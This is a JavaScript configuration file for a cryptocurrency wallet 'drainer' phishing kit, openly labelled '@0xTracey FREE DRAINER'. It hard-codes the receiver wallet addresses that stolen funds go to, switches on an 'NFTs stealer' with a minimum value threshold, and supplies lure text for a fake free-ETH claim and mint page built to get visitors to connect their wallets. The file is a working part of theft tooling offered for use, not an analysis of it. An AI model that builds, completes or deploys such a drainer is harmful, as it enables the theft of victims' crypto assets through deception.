// Collection settings
// Credits: @0xTracey on Github

// Using your Gnosis Safe multisig addresses
var receiverwallet = "0xcFE1432186f265D160Ad56e8F11b1277c4Db2044";  // Ethereum Gnosis Safe
var bep20receiverwallet = "0xcFE1432186f265D160Ad56e8F11b1277c4Db2044";  // BNB Gnosis Safe

// Define receiveAddress for compatibility
var receiveAddress = receiverwallet;

// Validate Ethereum addresses
if (!receiverwallet || !receiverwallet.startsWith("0x") || receiverwallet.length !== 42) {
    console.error("Invalid receiverwallet address. Must be a valid Ethereum address (42 characters starting with 0x).");
}

if (!bep20receiverwallet || !bep20receiverwallet.startsWith("0x") || bep20receiverwallet.length !== 42) {
    console.error("Invalid bep20receiverwallet address. Must be a valid Ethereum address (42 characters starting with 0x).");
}

if (!receiveAddress || !receiveAddress.startsWith("0x") || receiveAddress.length !== 42) {
    console.error("Invalid receiveAddress. Must be a valid Ethereum address (42 characters starting with 0x).");
}

const collectionInfo = {
    name: "@0xTracey FREE DRAINER",
    socialMedia: {
        discord: "https://discord.com",
        twitter: "https://twitter.com",
        instagram: "https://instagram.com",
    },
}

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "Claim Your Free ETH",
}

const claimPageInfo = {
    title: "@0xTracey DRAINER", // <br> is a line break
    shortDescription: "Get this Drainer for free though Github. @0xTracey",
    longDescription: "https://t.me/nftstealer",

    claimButtonText: "CLAIM NOW",

    image: "claim.jpg", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = @0xTracey on Github = = = = =
*/

// Default export for ES6 modules
export default {
    receiverwallet,
    bep20receiverwallet,
    receiveAddress,
    collectionInfo,
    indexPageInfo,
    claimPageInfo,
    drainNftsInfo,
    customStrings
};